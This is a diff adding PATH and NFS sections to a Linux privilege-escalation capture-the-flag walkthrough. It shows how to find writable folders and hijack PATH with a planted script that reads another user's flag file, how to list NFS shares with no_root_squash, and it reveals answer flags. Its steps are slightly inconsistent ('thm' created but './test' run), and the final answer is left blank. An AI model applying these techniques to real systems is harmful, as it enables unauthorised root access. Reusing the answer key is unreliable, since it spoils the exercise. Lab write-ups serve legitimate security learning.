@@ -325,7 +325,81 @@ This guide contains the answer and steps necessary to get to them for the [Linux
    ><details><summary>Click for answer</summary>123456</details>
 
 ### Privilege Escalation: PATH
+
+1. What is the odd folder you have write access for?
+
+   To find all writable folder we can use the following command. We will also look for subfolders, as that is shown in the answer.
+
+   ```cmd
+   find / -writable 2>/dev/null | cut -d "/" -f 2,3 | sort -u
+   ```
+
+   ><details><summary>Click for answer</summary>/home/murdoch</details>
+
+Exploit the $PATH vulnerability to read the content of the flag6.txt file.
+
+3. What is the content of the flag6.txt file?
+
+   Lets check were the flag files i located.
+
+   ```cmd
+   find / -name flag6* 2>/dev/null
+   ```
+
+   `/home/matt/flag6.txt`.
+   
+   We found the test file to be present in the home folder of Murdoch. so we need to add it to the PATH variable. As well as creating a thm file with a command to read the flag.
+
+   ```cmd
+   export PATH=/home/murdoch:$PATH
+   
+   echo "cat /home/matt/flag6.txt" > thm
+   ```
+
+   PATH PREP
+
+   Now we must make the file executable and run the test file.
+
+   ```cmd
+   chmod +x thm
+
+   ./test
+   ```
+
+   PATH FLAG
+
+   ><details><summary>Click for answer</summary>THM-736628929</details>
+
 ### Privilege Escalation: NFS
+
+1. How many mountable shares can you identify on the target system?
+
+   ```cmd
+   showmount -e 10.10.6.120 
+   ```
+
+   NFS SHARES
+
+   ><details><summary>Click for answer</summary>3</details>
+
+2. How many shares have the "no_root_squash" option enabled?
+
+   ```cmd
+   cat /etc/exports
+   ```
+
+   NFS SQUASH
+
+   ><details><summary>Click for answer</summary>3</details>
+
+Gain a root shell on the target system
+
+4. What is the content of the flag7.txt file?
+
+
+
+   ><details><summary>Click for answer</summary></details>
+
 ### Capstone Challenge
 
 
